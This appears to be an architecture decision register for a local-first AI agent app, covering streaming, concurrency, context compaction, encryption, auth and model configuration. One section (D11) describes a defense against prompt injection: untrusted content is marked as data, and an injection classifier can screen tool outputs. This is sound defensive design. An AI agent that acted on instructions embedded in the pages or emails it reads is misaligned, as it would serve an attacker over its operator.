# Architecture Decisions — open register

Decisions with genuine trade-offs. Each is **OPEN** until you weigh in; recommendations are starting points, not commitments. Referenced inline from the docs as **⟦OPEN: Dn⟧**.

Status legend: 🔵 open · 🟢 decided · ⚪ deferred (revisit when the area is built).

---

### D1 — Run streaming transport 🟢 DECIDED: SSE + POST control
**Question.** How does the server push the run event stream to the client?

- **SSE (server→client) + plain POST for control.** Native `Last-Event-ID` replay (matches `AE-7` "receive the output it missed" with zero custom catch-up logic); trivial to proxy; text-only is fine for our events. Cost: one-directional (control like *stop* is a separate POST — which we want anyway), and HTTP/1.1 per-origin connection caps (a non-issue over HTTP/2).
- **WebSocket (bidirectional).** One socket for stream + control; binary-capable. Cost: resume/catch-up is *manual* (we'd rebuild what SSE gives free), reconnection and proxying are fussier.
- **Both.** More surface to maintain for little gain at our scale.

**Decision:** **SSE + POST control.** It makes `AE-7` continuity nearly free, and we never need client→server streaming. Revisit only if a feature genuinely needs duplex.

---

### D2 — Concurrency / run-execution model 🟢 DECIDED: in-process asyncio
**Question.** Where do Runs actually execute?

- **In-process asyncio tasks + in-memory registry/broker.** Fits the single-operator, single-host profile. Model inference is an HTTP call to a local OpenAI-compatible server, so it never blocks the loop. `AE-7`'s "continuity need not survive a server restart" *explicitly licenses* in-memory state. Simplest possible thing that satisfies the spec.
- **External queue + worker (Redis/Celery/RQ).** Survives restarts, scales horizontally — neither of which the spec requires, and both add operational weight against the local-first principle.

**Decision:** **In-process.** A `RunRegistry` of asyncio tasks with a bounded global concurrency limit (Pydantic AI's own `ConcurrencyLimit` can cap concurrent agent runs; a small queue absorbs bursts — also satisfies `TASK-5` "no overlapping overload"). Keep the broker abstraction clean so an external backend is a later swap, not a rewrite.

**Parallelism (single host, many things at once).** The app runs as a **single main process** — required, because the Run registry, event broker, and resume buffers are **in-memory** (`AE-7`); multiple uvicorn workers would fragment that state and break continuity. We parallelize *within* the process: **asyncio** for massive I/O concurrency (concurrent Runs, parallel tool calls, concurrent search/read per `DR-3.4`, all background workers); a **ThreadPoolExecutor** for GIL-releasing native CPU work (crypto, SQLCipher, numpy/embeddings) — genuinely parallel; a **ProcessPoolExecutor** for heavy pure-Python CPU (parsing/extraction) for true multi-core. **Honest bottleneck:** concurrent *LLM* calls serialize on the model server's batching — one big local model won't run N turns truly in parallel; the separate role-endpoints (D16, e.g. `utility` on a smaller server) let tiers run concurrently without contending. We max out I/O + CPU parallelism; model throughput is bounded by what's served.

### D3 — Tool-relevance mechanism (`AE-4`) 🟢 DECIDED: no relevance layer — the model discerns
**Question.** How do we pick "only the tools relevant to this request" while always keeping a core set?

**Decision:** **Don't pre-filter at all.** Present the full (access-gated) catalog and let the model — a capable native-tool-calling model (`AE-8.1`) on one powerful host — discern what to invoke. `AE-4.1` is a *SHOULD-performance*, explicitly waivable with reason; the reason is our deployment profile, and the directive to not overcomplicate. We avoid the latency, infra, and misroute-failure modes of a selection layer entirely.

Consequences:
- The toolset stack drops its `.prepared(relevance_select)` step; only the **access gates** remain (privilege → enabled → naming).
- `AE-4.2` ("doc tools available when a document is open") is **trivially satisfied** — every tool is always present.
- The seam stays open: if the catalog ever grows large enough that the full tool list hurts accuracy or token cost, a `.prepared()` relevance step can be slotted in later **without touching anything else** in the stack. Candidate mechanisms if that day comes: embedding similarity (reuses our embedding capability) or a cheap classifier.

Rejected for now (kept for the record): embedding similarity · LLM classifier/router · static category routing · hybrid — all add cost/complexity the profile doesn't require.

**The honest nuance.** This is sound *provided the catalog stays lean*. Token cost and latency are neutralized by prompt-caching the (static) tool-definition prefix; the only real risk is **selection accuracy, which scales with total tool count** (capable models stay sharp to ~20–40 tools, degrade past ~50–80). The correct lever is therefore **tool design, not filtering**: coarse, action-parameterized tools (one `document` tool with an `action` field, not five) keep the catalog in the safe zone by construction. Viewed this way, `AE-4` is plausibly an **artifact** of the suboptimal original — a relevance index bolted on to cope with a sprawling, un-consolidated catalog. We avoid the cause instead of patching the symptom. **Watch item:** total tool count and observed selection accuracy on the actual local model; the `.prepared()` seam is insurance if a future catalog genuinely outgrows the model.

### D4 — Verifier / corrective meta-loop policy (`AE-5.2`, `AE-5.5`) 🟢 DECIDED: heuristic, configurable, capped
**Question.** After a turn, do we judge success and retry?

- **Always-on.** Highest reliability; every turn pays a judge round-trip and possibly a re-attempt.
- **Operator-configurable, default off (or on only for tool-producing turns).** The spec marks this SHOULD/MAY and says it MUST be bounded and MAY be operator-configurable — so config is sanctioned. Pay the cost only where it earns its keep.
- **Heuristic trigger.** Verify only when the turn produced a checkable artifact (a file, a document, a deliverable the user named).

**Recommendation:** **operator-configurable, default to the heuristic trigger**, with a hard cap on corrective attempts (e.g. 1). Judge model is the configurable "utility" model, separate from the main one. The no-progress **loop-breaker** (`AE-5.1`) is *always on* and independent of this — it inspects the running message history / tool-call signature and aborts on repetition.

### D5 — Chat-vs-agent routing (`CHAT-3`) 🟢 DECIDED: single always-agent path
**Question.** "Decide per message whether a direct answer suffices or tools are needed."

- **Single always-agent path.** Tools are always *offered* (relevance-narrowed), the model simply may call none. One code path; relevance selection naturally collapses to "core tools only" for chitchat. Slightly more prompt overhead on trivial messages.
- **Pre-classifier fast path.** A cheap check routes trivial messages to a tool-less, cheaper config. Lower latency/cost on small talk; a second path to maintain and a misroute risk.

**Recommendation:** **single always-agent path** to start (simplest, no misroute failure mode); the relevance scorer (D3) already does the practical work of not burdening trivial turns with the full catalog. Add a fast-path later if latency data justifies it.

### D6 — Context reduction near the limit (`AE-5.4`, `CHAT-4`) 🟢 DECIDED · ✅ BUILT
**Question.** How do we stay within the model's context window?

- **Pydantic AI history processor** that trims oldest turns when token budget is tight — cheapest, lossy.
- **Summarize-and-replace** older turns via the configurable utility model — preserves the thread, costs a call.
- **Hybrid:** keep a pinned head (system + active task + open document, which `AE-5.4` says MUST survive) + summarize the middle + keep recent verbatim.

**Recommendation (defer):** implement as a history processor so the mechanism is swappable; start with **hybrid** (pin the active task + open doc, summarize the middle with the utility model). Revisit when we measure real conversations.

**Built (first slice — tool-result compaction, `agent/compaction.py`), with three refinements the build settled:**
- **The seam is a `ProcessHistory` capability, and it is *not* persistence-transparent** — a history processor's output *becomes* `result.all_messages()`, which the engine persists. So "compact freely, persist the original" does **not** work. The build instead leans on the fact that the engine only persists `messages[start:]` (the current turn): the processor compacts **only prior-turn** tool results and never the current turn. Crucially the prior/current boundary is the **persistence index** (`start`), threaded in explicitly as `CompactionContext.protect_from` — *not* inferred from the last `UserPromptPart`. The verifier's corrective re-attempt injects a second user prompt mid-turn, so a last-prompt heuristic would push the original attempt's tool outputs onto the "prior" side and persist them as unrecoverable digests; anchoring to `start` keeps the protected set and the persisted set identical. The operator therefore keeps every tool output in full (persisted + streamed); only the model's replayed view of *prior* turns is condensed, re-derived from the full DB history each turn. (See `tests/test_compaction.py`.)
- **Trigger is a fixed rolling window, not token pressure.** Keep the K most-recent **prior-turn** tool results full (current-turn results are protected wholesale and never consume the window); digest older oversized ones (over a size floor), one rolling off at a time. A pressure/"near the limit" trigger recompacts a bulk of history *between two adjacent steps*, which can yank an output the model is mid-reasoning over; a fixed window rolls smoothly and deterministically. The replacement is a **notice only** — the omitted size plus the `builtin_expand_tool_result` call that recovers the full output verbatim, no excerpt. String and JSON-shaped results are both eligible (binary/multimodal stays verbatim); the expand tool's own output re-condenses once it ages past the window, so repeated expansion can't grow history without bound.
- **No overflow guard — compaction is efficiency, never a safety net.** It never shrinks the window or drops content to force-fit. If context still overflows, the run **stops with a `limit="context"` notice naming the model's window** (operator starts a new chat / trims) rather than degrade into bad answers. Provider context-length errors are mapped into that same clean stop.

**Built (second slice — conversation compaction, `agent/summarize.py`), completing the hybrid:**
- **A pressure trigger *is* right here, because it fires between turns.** The first slice rejected "near the limit" for the tool-result window on the grounds that it recompacts a bulk of history *between two adjacent steps* and can yank an output the model is mid-reasoning over. That objection is specific to compaction firing **inside** a turn's tool loop. Whole-turn folding runs in the orchestrator **prelude**, before the agent starts, so there is no in-flight reasoning to disturb — which is exactly why the deferred half can use the trigger the built half could not. Threshold is a fraction of the model's declared context window (default 0.95), operator-tunable globally and per conversation; an endpoint that declares no window never fires (there is nothing to measure against, and folding on a guess would compact a thread that was never under pressure). Where usage is unreported — local servers commonly return `input_tokens=0` — a coarse chars/4 estimate over **text parts only** stands in; counting a retained inline image's base64 would read one screenshot as hundreds of thousands of phantom tokens.
- **Append a checkpoint; never rewrite the tree.** The summary is one new node at the tip carrying the id of the last node it covers. Nothing is deleted: the operator's transcript keeps every folded turn, and a rewind above the checkpoint restores the full replay for free. The two consumers reorder it in *opposite* directions, deliberately — the model gets it **hoisted to the front** as a preamble (`model_history`), the operator sees it **in chronological position** (`messages_view`), because to the model it is a premise and to the operator it is an event. Splicing it in at the boundary instead would mean re-parenting a live node and pulling the turns below it out of their own version sets.
- **The boundary is a turn start, and not every user prompt is one.** Folding stops at the *N*-th-from-last turn start after any earlier checkpoint (so a compaction can never reach back past one and re-expose its summary), which keeps the retained tail replayable — a turn always opens with an operator prompt, so the split can't strand an assistant tool call from its result, and `AE-5.4`'s "the active request MUST remain intact" holds by construction. A mid-run steering message persists as its own request, so counting bare `UserPromptPart`s would keep two asides verbatim and fold a real exchange; a turn start is a user prompt that is the root or directly follows a response.
- **`start` must be measured after every history rewrite — including the library's own.** The persistence index is `len(the list handed to message_history)`, and Pydantic AI returns `all_messages()` **shorter** than what went in: preparing the wire format merges consecutive requests (most chat APIs cannot carry two user messages in a row). Hoisting a summary in front of a tail that opens on a user prompt creates exactly that adjacency, and the un-normalized index silently dropped the operator's own message from the turn it persisted. The engine now normalizes consecutive requests up front (`_merge_consecutive_requests`) — which also fixes the same latent shift for `_split_injected_requests`' output replayed on the following turn.
- **Still not a safety net.** Unchanged from the first slice: a prompt that overruns the window anyway stops the run with the `limit="context"` notice. Compaction lowers pressure; it never force-fits. A summarizer outage degrades to "no compaction" and the turn proceeds on the full history.

**Revised — the first slice is withdrawn; the second is the whole answer.** The hybrid turned out to have one half too many. `AE-5.4` is a *conditional* requirement — reduce older context **when the conversation approaches the model's context limit** — and only the second slice's trigger reads that condition. Everything else shrank content on turns under no pressure at all, which is not what the requirement asks for and is worse than not reducing: it costs the model the middle of exactly the output it just requested. Removed:

- **Tool-result compaction** (`agent/compaction.py` + `builtin_expand_tool_result`). Its "fixed rolling window, not token pressure" argument was sound about *where* it fired but wrong about *whether* it should fire: a smooth deterministic roll is still a roll that happens when nothing is full. A large tool result now rides into context whole, and the `limit="context"` stop — always the real backstop — catches a pathological turn while saying so out loud.
- **The attachment inline-text cap** — replaced rather than deleted. An uploaded document is now staged into the conversation's sandbox and handed to the model **as a file with a path**; the model chooses what to read and pages through it itself. A 300-page PDF costs the marker's handful of tokens instead of a truncated prefix, which is strictly better than either the cap or no cap. The fail-closed sandbox means staging can fail, so that path degrades to the extracted text inline *in full*, and the marker says so rather than naming a path that isn't there.
- **`code_execute`'s stdout/stderr trim.** Same reasoning as the tool-result window.

Two consequences worth stating. `auto_compact_keep_turns` drops to **0**: with the summary standing in for the whole replay, a retained tail restates what the summary already covers at the exact moment there is no room for it — and `AE-5.4`'s "active request MUST remain intact" still holds, since the fold runs in the prelude over history the new prompt is appended after, and `compaction_plan` refuses to graft onto a branch point (a regenerate's leaf has children, so the request being re-answered is unreachable). And the fold is now **visible**: the `conversation.compacted` event and the cold-read divider both carry `messages_compacted` plus a before/after token estimate, computed the same way on both paths so a reload can't disagree with what the operator just watched happen.

### D7 — Schema migration strategy (`XC-DATA-2`) 🟢 DECIDED: Alembic from day one
**Question.** How does an existing install upgrade its schema on startup with no manual step?

- **Inline idempotent migration functions** run from DB init. Dead simple, zero deps, total control; you hand-write each change. Fine for a single-DB, single-operator app.
- **Alembic.** Industry-standard, autogenerate + downgrade, version table. Heavier; more ceremony than a local-first single-user DB usually warrants.

**Decision:** **Alembic from day one.** Versioned migrations with autogenerate + downgrade; the upgrade is **auto-invoked on startup** so `XC-DATA-2` ("applied automatically… upgrades in place," no manual step) still holds. Chosen over inline because schema churn is expected and **SQLCipher complicates in-place `ALTER`s** (some need table-rebuild/copy dances) — better handled by explicit, reviewable migration scripts than ad-hoc introspection guards.

**As built.** Alembic lives at `backend/migrations/` with the initial revision capturing the current schema (conversations, messages, model_endpoints, model_roles). `core.db.init_db` runs `command.upgrade(cfg, "head")` on every boot, handing Alembic the **live engine** via `config.attributes['connection']` rather than letting `env.py` build its own — this is what lets the in-memory test DBs (schema on one shared connection) migrate at all. `render_as_batch=True` is on so SQLite `ALTER`s use the table-rebuild dance (anticipating the SQLCipher note in D17). The CLI path (`alembic revision --autogenerate`, `alembic check`) builds its own engine from `sqlalchemy.url` / `ODYSSEUS_DB_URL`. The Mako template imports `sqlmodel` so autogenerated `sqlmodel.sql.sqltypes` references resolve.

### D8 — Conversation-history persistence 🟢 DECIDED: in-memory working set + write-behind queue
**Question.** What is the source of truth for a conversation, and how does it reach the DB?

**Decision:** **Write-behind hybrid.** While a user is engaged, Pydantic AI's in-memory `ModelMessage` history is the **live working set** (a pseudo-cache) — runs read/continue from it with zero DB round-trips on the hot path. As each message completes, it is **copied onto a persistence queue** that drains to the DB asynchronously, off the critical path. The DB is the **durable** record (survives restart, serves history/search/metrics); memory is the **fast** record (serves the active turn).

Mechanics:
- Persistence is a **queue consumer on the run substrate** — the same place run events flow. Message-completion enqueues a write job; a background drainer batches them to the DB. Backpressure-bounded; failures retry without stalling the run.
- The durable form is the serialized `ModelMessage` (via `ModelMessagesTypeAdapter`/`to_jsonable_python`) for **resume fidelity**, alongside a thin derived projection (role, text, timestamps, run id, token counts) for **listing/search/metrics**. The projection is derived, never authoritative.
- On resuming a cold session, the blob rehydrates the in-memory working set; from there it's memory-speed again.

This is the concrete instance of "we own the queues": the write-behind drainer is one of a small family of background workers (persistence, scheduling, notifications) on the in-process substrate.

### D9 — Auth credential transport 🟢 DECIDED: dual (httpOnly cookie + bearer)
**Question.** Bearer token vs cookie session.

- **Bearer token** in `Authorization`. Works identically same-origin or split-origin; aligns with `AUTH-4` scoped API tokens (same verification path for humans and programmatic callers). No CSRF surface.
- **Cookie session.** Smoother for a pure same-origin browser app; CSRF + `SameSite` to manage; awkward across origins.

**Decision:** **Dual.** Browser sessions use an **httpOnly, `SameSite` cookie** (not XSS-exfiltratable — important for an admin console holding shell/vault); programmatic/API clients (`AUTH-4`) use **bearer tokens**. The server accepts either credential on a request. Cost: standard CSRF protection on the cookie path (SameSite + CSRF token).

### D10 — Repo package granularity 🟢 DECIDED: fine split
**Question.** How finely to split the backend.

- **Fine split** (`runs/ agent/ tools/ services/ research/ routes/ models/ core/`). Each concern is findable; matches the layer map; more top-level packages.
- **Fewer packages** (e.g. one `src/` with sub-modules). Less navigation, but the agent engine is the heart of this project and benefits from breathing room.

**Recommendation:** **fine split.** The Run substrate, the engine, the tools, and the capabilities are genuinely different concerns with different change-rates; keeping them as siblings makes the dependency direction visible and enforces "tools are thin."

### D11 — Untrusted-content marking technique (`XC-SEC-5`) 🟢 DECIDED (technique deferred)
**Question.** How to mark web pages, emails, uploads, retrieved docs, and the open editor doc as *data, not instructions*.

- **Delimiter/sentinel wrapping** in the prompt text (clear, model-agnostic, slightly hacky).
- **Distinct structured content parts** (cleaner; depends on model/part support).
- **A dedicated "untrusted context" section** with an explicit standing instruction to treat it as data.

**Decision (technique deferred):** the marking is **ours** — Pydantic AI has **no built-in "treat-as-data" primitive** (confirmed: it offers only adjacent pieces — `ReinjectSystemPrompt(replace_existing=True)` to keep our system prompt authoritative over untrusted history, a **Hooks** capability to intercept tool/model calls, and `PrepareTools` for tool filtering). So `XC-SEC-5` is met by a single `wrap_untrusted()` helper used by every context-builder and content-returning tool — sentinel-delimited blocks + a standing "treat as data" instruction to start, upgrading to structured parts where supported. We **compose** it with `ReinjectSystemPrompt` (defend against poisoned history) and optionally a **Hook** running an injection classifier over tool outputs / retrieved content. Centralized = one place to harden.

### D12 — ORM choice 🟢 DECIDED: SQLModel, sync DB in threadpool
- **SQLAlchemy (async)** — most capable, most ubiquitous, verbose.
- **SQLModel** — Pydantic-native (pairs with FastAPI + Pydantic AI), thinner, younger.
- **Tortoise / others** — Django-like; less synergy here.

**Decision:** **SQLModel**, with the **DB layer run synchronously in a threadpool executor.** D17's SQLCipher driver is a *sync* DBAPI, so a fully-async ORM stack doesn't pair cleanly; blocking SQLCipher calls go in a threadpool to keep the event loop free while retaining SQLModel's Pydantic-native ergonomics. Drop to raw SQLAlchemy Core only where SQLModel is too thin. (SQLCipher releases the GIL during I/O, so threadpool DB calls genuinely parallelize — ties into D2.)

### D13 — Scheduling / event triggers (`TASK-*`) 🟢 DECIDED: in-process, lock-aware
**Question.** What drives recurring/cron/event/webhook tasks?

- **In-process async scheduler** (a tick loop or APScheduler) firing tasks as Runs. Fits the in-process model (D2); dies with the process (tasks reschedule on boot from the DB).
- **External scheduler.** Survives restarts independently; more moving parts against local-first.

**Decision:** **in-process scheduler** that materializes due tasks as Runs on the same substrate, with the schedule persisted so boot rehydrates it. Inbound webhooks (`AUTH-5`) are just authenticated endpoints that enqueue a Run.

**As built — `SchedulerService` (`services/scheduler.py`) + `models/task.py` + `routes/tasks.py`.** One asyncio task per process: sleeps until the earliest enabled task's `next_run_at`, wakes, fires whatever is due, sleeps again (`_wait_for`/`wake()` — any task create/update/delete re-arms the sleep rather than waiting out a stale timer). **Lock-aware** like `core.worker.WriteBehindWorker`: task `title`/`prompt` are vault-sealed, so the loop parks (`_wait_unlocked`) whenever the vault is locked and resumes on unlock, rather than erroring or busy-looping against unreadable rows. **At-most-one missed-fire catch-up:** a locked/parked scheduler (or a slow boot) can leave `next_run_at` sitting in the past; the loop's ordinary due-check already doubles as the catch-up path — an overdue task fires once and its next occurrence is recomputed anchored on *now* (not the stale timestamp), so a gap never floods a burst of backlogged fires. **Non-overlap (`TASK-5`):** each task's in-flight execution is tracked as an asyncio task in `_running`; a tick that finds the previous execution still live records a `TaskRun` with outcome `skipped` instead of double-running, and nudges that task's own schedule forward by a short poll floor (not its real cadence) so a busy task isn't re-detected-and-re-skipped every iteration. `fire_now` (the manual `run_now` route and the inbound webhook) funnels through the same `_dispatch` non-overlap path as the tick loop, so an on-demand fire and a real due-tick can never double-run the same task. An **agent** task executes as an ordinary Run in a fresh conversation, titled from the task, reusing the chat turn's own composition (`routes/chat/`'s `resolve_turn_models`/`compose_turn`) rather than a second orchestration path; a **reminder** task fires its prompt verbatim as a notification, no AI phrasing (`TASK-6`). Inbound webhooks are realized as a per-task unguessable `webhook_token` (`secrets.token_urlsafe(32)`, the same construction as the previews proxy token) compared for equality on an auth-exempt route (`POST /tasks/hooks/{token}`) — the token *is* the credential, rotatable on demand via `PATCH /tasks/{id}` (`rotateWebhookToken`) — rather than a signed-payload/authenticated-endpoint scheme. **Deferred beyond this:** event triggers other than the inbound webhook, predefined automation actions/chaining (`TASK-3`), NL→schedule parsing (`TASK-4`), and email/push notification channels (`TASK-6` stays in-app only — see D30).

## Newly identified — not yet scheduled

Surfaced while surveying the whole spec; captured here so they aren't lost. One-liners now; each gets a full angle write-up when we pick it up. Ordered roughly by how foundational it is.

- **D14 — User model 🟢 DECIDED: single-operator, ownership seam only (C1) + capability gating by approval.** The spec's "privilege" conflates three independent axes; we separate them:
  - **Axis A — Authentication.** Kept fully — the app is a networked admin console and must authenticate even for one person (`XC-SEC-1`, `AUTH-1/2/4`).
  - **Axis B — Capability sensitivity.** *Reframed* from the spec's user-centric "admin-only tools" (vacuous with one admin) to **capability-centric**: certain tools are *sensitive* (shell, Python, filesystem-write, email-send, vault, config) and a sensitive call **requires explicit user approval before it executes** (see **D20**). This is what actually constrains the *autonomous agent*, which is the real threat surface here — not other humans.
  - **Axis C — Multi-tenancy.** **C1 (seam only):** every record carries an `owner_id` defaulting to the single operator, but **no ownership-enforcement checks and no per-user privilege/management UI are built yet.** Rationale: the one expensive, regret-prone future migration is retrofitting an owner column onto a populated schema and finding every query site — so we *pre-pay* that with a free column now and defer the enforcement (and `AUTH-3` user management, per-user setting overrides) until a second human actually exists. C0 (no column) saves a triviality at the price of that retrofit; C2 (full enforcement now) builds a multi-tenant fortress for a population of one, mostly unexercisable.

  Net posture: **authenticate fully · gate sensitive capabilities by approval · attribute data to an owner but don't enforce isolation yet.** Spec edited in place to match (`AE-3`, `XC-SEC-2/6`), keeping the spec black-box (no mention of the approval *mechanism*).

- **D15 — The concrete event protocol (`AE-6`) 🟢 DECIDED (v1 frozen).** The backend↔frontend streaming contract.
  - **Framing.** SSE; each frame's `id:` = a **per-run monotonic `seq`**, `data:` = a typed JSON envelope `{type, seq, ts, …payload}`. **One channel**, type lives in the JSON (not SSE's `event:` field) — simplest for our own client. Strict ordering by `seq` within a run; deltas are append-only.
  - **Resume (`AE-7`).** On reconnect the client sends `Last-Event-ID` = last `seq` seen; the server replays every buffered event with `seq >` that, then goes live. The per-run event buffer lives in memory for the run's lifetime.
  - **Versioning.** Protocol version announced in `run.started`; additive events/fields don't bump it, breaking changes do.
  - **Naming convention.** `entity.event`, **dot.lowercase**. Discrete (it *happened*) → past-tense verb (`started`, `committed`, `failed`); streaming increments → `delta`/`progress`.
  - **v1 event set:**
    - **Run:** `run.started` · `run.metrics` · `run.ended` · `run.error`
    - **Step:** `step.started` · `step.completed`
    - **Content:** `thinking.delta` · `answer.delta` (the `AE-6.3` reasoning/answer split)
    - **Tools:** `tool.started` · `tool.progress` (elapsed + partial, for slow tools) · `tool.completed` · `tool.failed`
    - **Documents:** `document.created` · `document.delta` · `document.committed` (`AE-6.2`)
    - **Notices:** `citation.added` · `approval.required` (D20) · `limit.notice`
  - **Deltas are coalesced server-side** (batched by time/punctuation, not one frame per token) for smoother render and lower frame overhead.
  - **Tool payloads are full inline** (complete args + results on the stream), not summaries — for user transparency; the client compacts them in an expandable view. (Full history is also persisted.)
  - These events are produced by translating Pydantic AI's native stream (`PartStartEvent`/`PartDeltaEvent` for thinking/answer parts, tool-call/return events, `FinalResultEvent`) and by emitting the ones the library doesn't know about (step boundaries, document lifecycle, citations, approvals, limit notices, run metrics, end).

- **D16 — Model/endpoint configuration & the utility model 🟢 DECIDED: named roles → endpoint/fallback-chain; single global utility.**
  - **Roles.** Fixed named roles the engine consumes: **`main`** (agent/chat), **`utility`** (cheap background work), **`embedding`** (recall), and later **`vision`** (scanned-PDF extraction). *(An `image-gen` role was listed here originally; image generation has since been struck from the spec — the product neither generates nor edits images.)* Each role binds to **an endpoint or an ordered fallback chain** of endpoints.
  - **`main` is overridable per conversation** (the chat model picker); all other roles are **global settings**.
  - **`utility` is a single global role** used by summarization (`CHAT-4`), verification (`AE-5.2`), email triage (`EMAIL-2`), NL parsing (`TASK-4`/`CAL-3`), titles, and memory extraction. **If unset it falls back to `main`.** Seam exists to split per-feature later, but we don't start there.
  - **Endpoints** are provider-agnostic: OpenAI-compatible `base_url` + model name + optional key + metadata — **context window** (feeds context reduction `AE-5.4`), and **capability flags** (native tool-calling is required `AE-8.1`; vision; thinking). Local (llama.cpp/Ollama/MLX/vLLM) or remote, per the local-first-but-configurable principle.
  - **Registry & resolution.** The endpoint registry lives in the **encrypted** settings, populated by manual config **and** the Cookbook (`COOK-4`) when it serves a model. At run start the orchestrator resolves the model from the role (with the per-session override for `main`) and builds the Pydantic AI model — wrapping the role's chain in **`FallbackModel`** (`AE-5.3`). The *"don't switch endpoints once answer text has streamed"* rule (`AE-5.3`) is enforced by **our** orchestrator, not the library: fallback is only allowed before the first `answer.delta`.
  - **Ripple → D18 / `EMB-2`:** the `embedding` role couples to the vector store; changing it must not lose existing recall, so each stored vector records which embedding model/dimension produced it (re-embed or segregate on change).
  - **As built.** The registry is the **single source of truth** for model resolution — there is no `.env` model seam and no runtime fallback to one (an unconfigured role is a degraded capability, surfaced as a clear "configure a model" error). It is realized as structured tables (`model_endpoints` + `model_roles`) rather than a generic encrypted-settings KV; only the **API key field is application-layer AEAD-encrypted** (the at-rest posture after whole-DB SQLCipher was ruled out — see D17), while base_url/model/flags stay indexable in the clear. The operator manages it through `/models/*`; the automatic-setup/Cookbook (`COOK-4`) populates it through the **same** `create_endpoint` + `set_role` write path. Roles resolve through `services.registry.ModelRegistry.resolve`; `services.llm` owns only the spec→model builders and the `FallbackModel` chain wrap.

- **D17 — At-rest encryption & key management (`XC-SEC-3`) 🟢 DECIDED.** All user data at rest is encrypted; the system is a vault that must be unlocked each boot.
  - **Cipher (settled by cryptography, not preference):** symmetric **AES-256-GCM** (or XChaCha20-Poly1305) *is* the post-quantum-safe choice — AES-256 retains ~128-bit strength under Grover; NIST excludes symmetric crypto from PQC transition. There is no PQ bulk cipher to adopt. PQC (hybrid X25519+ML-KEM) is reserved for *asymmetric key wrapping* (portable backups, future multi-device) — a deferred seam, not a dependency.
  - **Granularity — DECIDED: whole-DB + encrypted files.** SQLCipher encrypts the entire SQLite file (rows, indexes, FTS, embedded vectors — transparent to queries); large files (uploads/docs/gallery/personal-docs) are per-file AEAD blobs under the same key hierarchy. The vault keeps its own extra layer on top.
  - **As built — application-layer AEAD, not whole-DB SQLCipher (revised).** Whole-DB SQLCipher needs a SQLCipher-linked `sqlite3` driver, and there are **no portable wheels for our runtime (Python 3.14)** — adopting it would mean building from source / pinning Python, which breaks `XC-PORT-1` (must run with no OS-specific build dance across Linux/macOS/Windows). So at-rest encryption is **application-layer AES-256-GCM** under the *same* password-derived, memory-only DEK and key hierarchy described below — only the *granularity* changes: instead of the whole file being opaque, **each sensitive value is sealed in its column** (conversation message text + serialized `ModelMessage` blob; model-endpoint API keys), while structural metadata that must be indexed/ordered (ids, owner, timestamps, seq, kind, base_url, model name, capability flags) stays in the clear. Encryption happens on the **lock-aware** side of the write-behind queue, so a mid-turn lock parks the write rather than losing it. The cipher, key custody, lock lifecycle, and PQ posture are **unchanged** — only the boundary moves from "the file" to "the sensitive fields." **Trade-off accepted:** indexes/FTS over plaintext columns are not encrypted (acceptable — they hold structural keys, not content), and remembering to seal each new sensitive column is now a design responsibility (the model registry's `api_key` is the first to follow it). **The whole-DB design stays the target seam:** if portable SQLCipher wheels appear, or the data model grows enough that field-level coverage becomes error-prone, the `core.db` engine factory is the single swap-in point (Alembic already runs with `render_as_batch=True` for the `ALTER` constraints SQLCipher would impose). Large-file per-file AEAD (uploads/docs/gallery) is unaffected and lands with those features.
  - **Key custody — DECIDED: password-derived, lock-until-unlocked.** The operator's **login password is the key material**. Two-tier hierarchy: password → **KEK** via **Argon2id** (dedicated salt) → unwraps a random **DEK** (so a password change only re-wraps the DEK, never re-encrypts data). Auth-verifier and KEK are **domain-separated** (independent HKDF labels / salts) so the stored login hash is useless for decryption. The **DEK lives only in process memory** after unlock — never written to disk and never to any OS keystore (no Keychain / DPAPI / `libsecret` dependency), which also makes this the **most platform-agnostic** custody option: byte-for-byte identical behavior on Linux, macOS, and Windows. **Auth secrets stay hashed** (Argon2id), never encrypted (`XC-SEC-4`).
  - **Lock lifecycle:** on boot/restart the app is **locked** (encrypted data inaccessible); first successful login derives the KEK and unwraps the DEK into memory, **unlocking** it for the process lifetime. An explicit *lock* control (and optionally an idle timeout) wipes the DEK from memory, requiring re-unlock. Restart ⇒ re-unlock.
  - **Consequence — background work is lock-aware (ripple → D13).** The scheduler, email triage, reminder dispatch, webhook handlers, and the write-behind persistence drainer all touch encrypted data, so they **only run while unlocked**. While locked they **park gracefully** (persist intent, surface a "locked" status) rather than erroring or dropping events; on unlock they catch up a bounded backlog. After a restart, unattended features stay paused until the operator logs in — an accepted trade for maximum confidentiality.
  - **Consequence — app "locked" state surfaces to the client.** The shell needs a locked/unlocked indicator and an unlock prompt; health/connection status reflects it.
  - **Edge — `AUTH_ENABLED=false`.** At-rest encryption needs an unlock secret even when network auth is off. Resolution (provisional): the **unlock passphrase is conceptually separate from login** — disabling auth disables the *login gate*, not the *unlock*; the operator still supplies a passphrase to derive the key. (Equivalently, at-rest encryption makes an unlock step effectively mandatory.) Confirm when we build auth.
  - **Ripple → D18:** pushes the vector store toward **embedded (sqlite-vec inside the encrypted DB)** so embeddings are encrypted for free; an external Chroma would be a separate plaintext store needing its own encryption.
  - **Ripple → `BACKUP-*`:** a backup must be decryptable on another host, so export re-wraps the DEK under a **separate backup secret** (recovery key / passphrase) — the natural home for an optional PQ-hybrid (X25519+ML-KEM) key-wrap later. A forgotten password with no recovery key = unrecoverable data (accepted for a single operator; recovery key is the mitigation).

- **D18 — Vector store (`XC-DEG-1`, `MEM-2`, `RAG-2`, `EMB-*`) 🟢 DECIDED: pluggable interface, `sqlite-vec` default.** Vectors live in **`sqlite-vec` inside the encrypted DB** (D17) — one encrypted store, no extra service; brute-force KNN is fine at single-operator volumes. The pluggable interface keeps the seam to slot an external store (Chroma, etc.) if volume outgrows brute-force. Degrades to **keyword search** when vector search is unavailable (`XC-DEG-1`). Each vector records its embedding model/dimension so an `embedding`-role change (D16, `EMB-2`) re-embeds or segregates rather than corrupting recall.
